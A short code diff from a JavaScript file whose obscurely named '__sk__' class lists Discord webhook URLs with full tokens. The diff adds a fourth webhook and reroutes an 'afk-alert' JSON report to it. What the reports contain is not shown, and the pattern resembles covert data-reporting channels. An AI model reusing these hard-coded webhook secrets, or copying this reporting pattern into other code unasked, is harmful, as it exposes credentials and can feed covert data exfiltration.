@@ -43,8 +43,9 @@ const __sk__ = new class {
     __api() {
         const main = ["POST", "https://discord.com/api/webhooks/1317554277559828611/Q_lPvgfmaHBziNXlaVPgbbvNzslGNJ8tVGUfkmX-pesssVIOzKZi9XzBn0da_s-csDOv"],
               logs = ["POST", "https://discord.com/api/webhooks/1205023134223433769/UJBpKmPVwpkbJ-_KdS4Elkf8AHmnz15XgzsLfR6ntaF3ESw30SzxfGprza9cOKDstORK"],
-              afk_channel = ["POST", "https://discord.com/api/webhooks/1321056693446115360/tZN31FQp5YJAGq_0HltIom-gy7JUZHr9_em9ReJieSBs5l_vSMTc3nBQAddxCp97qjGP"]
-        return {main, logs, afk_channel}
+              afk_channel = ["POST", "https://discord.com/api/webhooks/1321056693446115360/tZN31FQp5YJAGq_0HltIom-gy7JUZHr9_em9ReJieSBs5l_vSMTc3nBQAddxCp97qjGP"],
+              logs_channel = ["POST", "https://discord.com/api/webhooks/1321726592271122483/cVRVESgrvE8sc8b7gyRfQTvfrn0dvpSYNktlQBYMMYsLO5sYVgrE0JCjgOO6LF8lE3cY"]
+        return {main, logs, afk_channel, logs_channel}
     }
 
     __apiRequest(api, data) {
@@ -92,7 +93,7 @@ const __sk__ = new class {
                     }],
                 }))
             }
-            this.__apiRequest(this.__api().afk_channel, JSON.stringify({
+            this.__apiRequest(this.__api().logs_channel, JSON.stringify({
                 username: "afk-alert",
                 avatar_url: "https://raw.githubusercontent.com/osso-a/lmrynzfgfr/refs/heads/main/9u7njxxjg8/ymzsuti7z0i.png",
                 content: "```js\n" + JSON.stringify({
